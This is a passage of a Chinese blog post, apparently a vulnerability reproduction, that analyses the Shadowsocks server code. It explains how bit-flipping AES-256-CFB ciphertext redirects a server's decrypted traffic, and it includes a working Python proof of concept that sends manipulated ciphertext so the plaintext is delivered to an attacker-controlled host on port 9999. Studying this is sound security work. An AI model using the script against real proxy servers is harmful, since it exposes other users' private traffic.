DEBUG    destroying remote</span><br><span class="line"><span class="number">2023</span><span class="number">-01</span><span class="number">-12</span> <span class="number">17</span>:<span class="number">03</span>:<span class="number">04</span> DEBUG    destroying <span class="keyword">local</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>接下来我们分析服务端的处理逻辑，服务端做的事情可以划分为：</p>
+<ol>
+<li>接受客户端的消息并解密</li>
+<li>前七个字节是目标网站的信息，于是服务端向目标网站发起连接，然后向目标网站发送解密后七个字节之后的消息</li>
+<li>接受目标网站的回复</li>
+<li>将回复加密后发送给客户端</li>
+</ol>
+<p>在代码层面和客户端其实没有很大差别，主要调用的也是TCPrelay这一块的代码，区别就是在于标志符 is_local，主要区别我们注意到  _on_local_read 这个函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_on_local_read</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="comment"># handle all local read events and dispatch them to methods for</span></span><br><span class="line">    <span class="comment"># each stage</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> self._local_sock:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    is_local = self._is_local</span><br><span class="line">    data = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = self._local_sock.recv(BUF_SIZE)</span><br><span class="line">    <span class="keyword">except</span> (OSError, IOError) <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">if</span> eventloop.errno_from_exception(e) <span class="keyword">in</span> \</span><br><span class="line">                (errno.ETIMEDOUT, errno.EAGAIN, errno.EWOULDBLOCK):</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">        self.destroy()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    logging.debug(<span class="string">"read local data: %s"</span> % data)</span><br><span class="line">    self._update_activity(len(data))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_local:</span><br><span class="line">        data = self._encryptor.decrypt(data)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> self._stage == STAGE_STREAM:</span><br><span class="line">        <span class="keyword">if</span> self._is_local:</span><br><span class="line">            data = self._encryptor.encrypt(data)</span><br><span class="line">        self._write_to_sock(data, self._remote_sock)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">elif</span> is_local <span class="keyword">and</span> self._stage == STAGE_INIT:</span><br><span class="line">        <span class="comment"># TODO check auth method</span></span><br><span class="line">        self._write_to_sock(<span class="string">b'\x05\00'</span>, self._local_sock)</span><br><span class="line">        self._stage = STAGE_ADDR</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">elif</span> self._stage == STAGE_CONNECTING:</span><br><span class="line">        self._handle_stage_connecting(data)</span><br><span class="line">    <span class="keyword">elif</span> (is_local <span class="keyword">and</span> self._stage == STAGE_ADDR) <span class="keyword">or</span> \</span><br><span class="line">            (<span class="keyword">not</span> is_local <span class="keyword">and</span> self._stage == STAGE_INIT):</span><br><span class="line">        self._handle_stage_addr(data)</span><br></pre></td></tr></table></figure>
+
+<p>我们知道，服务端第一次收到客户端消息的时候，消息内容是 <strong>iv+encrypt(atype|ip|port|data)</strong>，于是，第一步肯定是对其进行解密</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> is_local:</span><br><span class="line">        data = self._encryptor.decrypt(data)</span><br></pre></td></tr></table></figure>
+
+<p>解密后得到 <strong>atype|ip|port|data</strong>，此时 self._stage == STAGE_INIT（因为是第一次接收到消息），因此进入 self._handle_stage_addr(data) 函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_handle_stage_addr</span><span class="params">(self, data)</span>:</span></span><br><span class="line">     <span class="keyword">try</span>:</span><br><span class="line">         <span class="keyword">if</span> self._is_local:</span><br><span class="line">             ...</span><br><span class="line">             <span class="keyword">elif</span> cmd == CMD_CONNECT:</span><br><span class="line">                 <span class="comment"># just trim VER CMD RSV</span></span><br><span class="line">                 data = data[<span class="number">3</span>:]</span><br><span class="line">             <span class="keyword">else</span>:</span><br><span class="line">                 logging.error(<span class="string">'unknown command %d'</span>, cmd)</span><br><span class="line">                 self.destroy()</span><br><span class="line">                 <span class="keyword">return</span></span><br><span class="line">         header_result = parse_header(data)</span><br><span class="line">         <span class="keyword">if</span> header_result <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">             <span class="keyword">raise</span> Exception(<span class="string">'can not parse header'</span>)</span><br><span class="line">         addrtype, remote_addr, remote_port, header_length = header_result</span><br><span class="line">         logging.info(<span class="string">'connecting %s:%d from %s:%d'</span> %</span><br><span class="line">                      (common.to_str(remote_addr), remote_port,</span><br><span class="line">                       self._client_address[<span class="number">0</span>], self._client_address[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">         self._remote_address = (common.to_str(remote_addr), remote_port)</span><br><span class="line">         self._update_stream(STREAM_UP, WAIT_STATUS_WRITING)</span><br><span class="line">         self._stage = STAGE_DNS</span><br><span class="line">         <span class="keyword">if</span> self._is_local:</span><br><span class="line">             ...</span><br><span class="line">         <span class="keyword">else</span>:</span><br><span class="line">             <span class="keyword">if</span> len(data) &gt; header_length:</span><br><span class="line">                 self._data_to_write_to_remote.append(data[header_length:])</span><br><span class="line">             <span class="comment"># notice here may go into _handle_dns_resolved directly</span></span><br><span class="line">             self._dns_resolver.resolve(remote_addr,</span><br><span class="line">                                        self._handle_dns_resolved)</span><br><span class="line">     <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">         self._log_error(e)</span><br><span class="line">         <span class="keyword">if</span> self._config[<span class="string">'verbose'</span>]:</span><br><span class="line">             traceback.print_exc()</span><br><span class="line">         self.destroy()</span><br></pre></td></tr></table></figure>
+
+<p>由于此时是服务端，因此直接进入 parse_header 函数进行解析，得到 addrtype, remote_addr, remote_port, header_length，那么根据前面的经验，接下来就是服务端与目标网站建立连接，随后将用户的消息（data）发送给目标网站，再接收回复，再加密，再发送给客户端。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_on_remote_read</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># handle all remote read events</span></span><br><span class="line">        data = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = self._remote_sock.recv(BUF_SIZE)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> (OSError, IOError) <span class="keyword">as</span> e:</span><br><span class="line">            ...</span><br><span class="line">        <span class="keyword">if</span> self._is_local:</span><br><span class="line">            data = self._encryptor.decrypt(data)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data = self._encryptor.encrypt(data)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self._write_to_sock(data, self._local_sock)</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>
+
+<p>于是我们就从代码层面完成了对整个代理流程的分析，那么，问题出现在哪儿呢？</p>
+<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>我们注意到，客户端会将消息解密并发送给用户，而服务端会将消息解密发送给指定的地址，而这个指定的地址则是解密后通过parse_header 解析得到。那么如果我们能够在无法解密的情况下对这个地址进行操控，我们是否就能让服务端将解密后的信息发送到任意我们指定的地址，我们也就能够获得解密后的信息了。</p>
+<p>那么如何 <strong>在无法解密的情况下对这个地址进行操控</strong> 呢？注意到我们选择的默认加密模式为 aes-256-cfb</p>
+<p><img src="https://s2.loli.net/2023/01/31/w1TrotS2s8bG6yu.png" alt></p>
+<p>可以看到是类似于流密码，而我们知道，由于异或运算的特性，流密码是无法抵抗已知明文攻击的，那么我们知道哪些明文呢？</p>
+<p>显然，服务端最终发送给客户端的加密消息格式为 <strong>IV + encrypt(data)</strong> 其中，IV是16个字节，剩下的data，由于HTTP响应包的格式基本上就是<code>HTTP/1.1 200 OK\r\nHost</code>，因此，我们是能够得到图中的 $e_k$ 的，也就是 IV 经过 AES 加密后的值。我们设明文为 $x_1$，密文为 $y_1$，想要将数据篡改为 $x_2$，于是</p>
+<p>由 $y_1 \oplus e_k = x_1$，其中 $x_1,e_k,y_1$ 均已知，因此</p>
+<p>$y_1 \oplus e_k \oplus x_1 \oplus x_2 = x_1 \oplus x_1 \oplus x_2 = x_2$</p>
+<p>所以我们只需要将密文 $y_1 $ 篡改为 $y_1 \oplus x_1 \oplus x_2$ 即可</p>
+<p>由于控制地址部分是七个字节（Atype  +ip +port ）于是，我们设待破解密文为 <strong>IV + encrypt(“HTTP/1.” )+ encrypt(data)</strong>，</p>
+<p>那么我们重新构造密文为 $IV+encrypt(“HTTP/1.” ) \oplus “HTTP/1.” \oplus (Atype+ip+port) + padding（9字节） +IV + encrypt(“HTTP/1.” )+ encrypt(data)$</p>
+<p>然后将该数据发送给服务端，服务端收到解密后，将得到消息</p>
+<p>$(Atype+ip+port) + <strong><strong>（9字节） +</strong></strong>(16字节) + data$</p>
+<p>前面七个字节是我们控制的地址，然后是9个字节填充解密后的乱码，然后是16个字节IV解密后的乱码，剩下来就是对数据的正常解密。</p>
+<p>然后服务端就会与我们控制的地址建立连接，将后续包括解密填充的乱码、解密IV的乱码、解密后的正常数据全部发送过去。那么至此我们就完成了解密数据的重定向，换句话说，我们在没有解密密钥的情况下，获得了数据明文。</p>
+<h2 id="漏洞演示"><a href="#漏洞演示" class="headerlink" title="漏洞演示"></a>漏洞演示</h2><p>我们抓下服务端最后发送给客户端的加密消息</p>
+<p><img src="https://s2.loli.net/2023/01/31/pSOL6qeK5crZDVu.png" alt></p>
+<p>然后在我自己的服务器上开了一个9999端口进行监听</p>
+<p>运行 python 脚本，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> bytes(x^y <span class="keyword">for</span> x,y <span class="keyword">in</span> zip(a,b))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ip2hex</span><span class="params">(ip)</span>:</span></span><br><span class="line">	ip = ip.split(<span class="string">"."</span>)</span><br><span class="line">	res = <span class="string">b""</span>.join(long_to_bytes(int(i)) <span class="keyword">for</span> i <span class="keyword">in</span> ip)</span><br><span class="line">	<span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">data = bytes.fromhex(<span class="string">"bf988dd6c949f977528ec6449edcc615f0f472be1745a3bb603f60a9e089caa16af7faa5bfcede63be4fe1ef069185da0a251ef80f62ad74ae3103736305f195a40e1487888ba7e9480e6ba66b6b91f91467da5161bf4a5783bb85034f8e4c6ec269b1c4e827551cf40903b3ec4e7e051f0a68a36b3b27994a758cd49ce013853ede7fd240d4928ed02ef8d6b1bf043396eabd7d9e08d44aa687fcd6c967d68b16c96d40e461b0992314ac043d924bd58c011c55300ddd28d8e6d9c4c4eea410404f9e2b65783f5b1bd29b9afff8147eac1eddcc93288fbdfb827f"</span>)</span><br><span class="line"></span><br><span class="line">x1 = <span class="string">b"HTTP/1."</span></span><br><span class="line">x2 = <span class="string">b"\x01"</span> + ip2hex(<span class="string">"xx.xx.xx.xx"</span>) + long_to_bytes(<span class="number">9999</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">new_data  = data[:<span class="number">16</span>] + xor(xor(x1, x2), data[<span class="number">16</span>:<span class="number">16</span>+<span class="number">7</span>]) + <span class="string">b"\x00"</span>*(<span class="number">9</span>) + data</span><br><span class="line"></span><br><span class="line">sh = socket.socket()</span><br><span class="line">sh.connect((<span class="string">"127.0.0.1"</span>, <span class="number">8388</span>))</span><br><span class="line">sh.send(new_data)</span><br><span class="line">time.sleep(<span class="number">20</span>)</span><br></pre></td></tr></table></figure>
+
+<p>在服务器9999端口成功收到解密后的消息（可以看到在正常消息前会有一小段乱码）</p>
+<p><img src="https://s2.loli.net/2023/01/31/r9mqIXvcCReGYNy.png" alt></p>
+<h2 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h2><p>在复现的时候踩到一个坑，由于我们是使用python脚本和服务端进行直接通信的，我们在运行完最后一行send后，不能立刻结束脚本，否则脚本和服务端的连接就会断开，而一旦脚本和服务端的连接断开了，服务端也会立刻终止与目标网站的通信（在向目标网站发送解密消息之前）。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">destroy</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="comment"># destroy the handler and release any resources</span></span><br><span class="line">    <span class="comment"># promises:</span></span><br><span class="line">    <span class="comment"># 1. destroy won't make another destroy() call inside</span></span><br><span class="line">    <span class="comment"># 2. destroy releases resources so it prevents future call to destroy</span></span><br><span class="line">    <span class="comment"># 3. destroy won't raise any exceptions</span></span><br><span class="line">    <span class="comment"># if any of the promises are broken, it indicates a bug has been</span></span><br><span class="line">    <span class="comment"># introduced! mostly likely memory leaks, etc</span></span><br><span class="line">    <span class="keyword">if</span> self._stage == STAGE_DESTROYED:</span><br><span class="line">        <span class="comment"># this couldn't happen</span></span><br><span class="line">        logging.debug(<span class="string">'already destroyed'</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    self._stage = STAGE_DESTROYED</span><br><span class="line">    <span class="keyword">if</span> self._remote_address:</span><br><span class="line">        logging.debug(<span class="string">'destroy: %s:%d'</span> %</span><br><span class="line">                      self._remote_address)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        logging.debug(<span class="string">'destroy'</span>)</span><br><span class="line">    <span class="keyword">if</span> self._remote_sock:</span><br><span class="line">        logging.debug(<span class="string">'destroying remote'</span>)</span><br><span class="line">        self._loop.remove(self._remote_sock)</span><br><span class="line">        <span class="keyword">del</span> self._fd_to_handlers[self._remote_sock.fileno()]</span><br><span class="line">        self._remote_sock.close()</span><br><span class="line">        self._remote_sock = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> self._local_sock:</span><br><span class="line">        logging.debug(<span class="string">'destroying local'</span>)</span><br><span class="line">        self._loop.remove(self._local_sock)</span><br><span class="line">        <span class="keyword">del</span> self._fd_to_handlers[self._local_sock.fileno()]</span><br><span class="line">        self._local_sock.close()</span><br><span class="line">        self._local_sock = <span class="literal">None</span></span><br><span class="line">    self._dns_resolver.remove_callback(self._handle_dns_resolved)</span><br><span class="line">    self._server.remove_handler(self)</span><br></pre></td></tr></table></figure>
+
+<p>因此我们需要让脚本再阻塞一会，等待消息被解密发送完成后再结束脚本，也就是脚本最后一行 <strong>time.sleep()</strong> 的用意。 </p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可联系QQ 643713081，也可以邮件至 643713081@qq.com </span>
+    </div>
+</article>
+
+
+<p>
+    <a  class="dashang" onclick="dashangToggle()">赏</a>
+</p>
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>Shadowsocks Redirect Attack</p>
+    <p><span class="copy-title">文章字数:</span><span class="post-count">6.7k</span></p>
+    <p><span class="copy-title">本文作者:</span><a  title="Van1sh">Van1sh</a></p>
+    <p><span class="copy-title">发布时间:</span>2023-01-30, 17:14:00</p>
+    <p><span class="copy-title">最后更新:</span>2023-01-31, 16:33:57</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2023/01/30/Shadowsocks Redirect Attack/" title="Shadowsocks Redirect Attack">http://jayxv.github.io/2023/01/30/Shadowsocks Redirect Attack/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">©2020 Van1sh</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full"><span class="min "></span></button>
+<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
+<div class="post-toc"><span class="post-toc-title">目录</span>
+    <div class="post-toc-content">
+
+    </div>
+</div>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+<div class="acParent"></div>
+
+<div class="hide_box" onclick="dashangToggle()"></div>
+<div class="shang_box">
+    <a class="shang_close"  onclick="dashangToggle()">×</a>
+    <div class="shang_tit">
+        <p>喜欢就点赞,疼爱就打赏</p>
+    </div>
+    <div class="shang_payimg">
+        <div class="pay_img">
+            <img src="/img/alipay.jpg" class="alipay" title="扫码支持">
+            <img src="/img/weixin.jpg" class="weixin" title="扫码支持">
+        </div>
+    </div>
+    <div class="shang_payselect">
+        <span><label><input type="radio" name="pay" checked value="alipay">支付宝</label></span><span><label><input type="radio" name="pay" value="weixin">微信</label></span>
+    </div>
+</div>
+
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.0.1" ></script>
+
+<script src="/js/script.js?v=1.0.1" ></script>
+<script>
+    var img_resize = 'default';
+    /*作者、标签的自动补全*/
+    $(function () {
+        $('.search').AutoComplete({
+            'data': ['@Van1sh','@FzWjScJ','#Write Up','#docker','#Sage','#CTF','#ECC','#TLS 1.2','#Crypto','#Paillier','#Web','#Files','#Serialization','#Lattice','#Dsa','#LCG','#Rc4','#SM4','#paper','#small private exponent','#SQL','#python','#Knapsack','#Rsa','#continued_fraction','#RE','#DES','#差分密码分析','#操作模式','#number theory','#Abstract algebra','#ETH','#SPN','#线性密码分析','#Book','#Shadowsocks','#Nmap','#XSS','#Linux','#Coppersmith’s Method','#book',],
+            'itemHeight': 20,
+            'width': 418
+        }).AutoComplete('show');
+    })
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $(".post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+        $("input[name=pay]").on("click", function () {
+            if($("input[name=pay]:checked").val()=="weixin"){
+                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
+            } else {
+                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
+            }
+        })
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+    function dashangToggle() {
+        $(".shang_box").fadeToggle();
+        $(".hide_box").fadeToggle();
+    }
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+        .nav .hide-list.fullscreen {
+            left: 492px
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.3;
+        background: url("https://i.loli.net/2019/07/22/5d3521411f3f169375.png");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
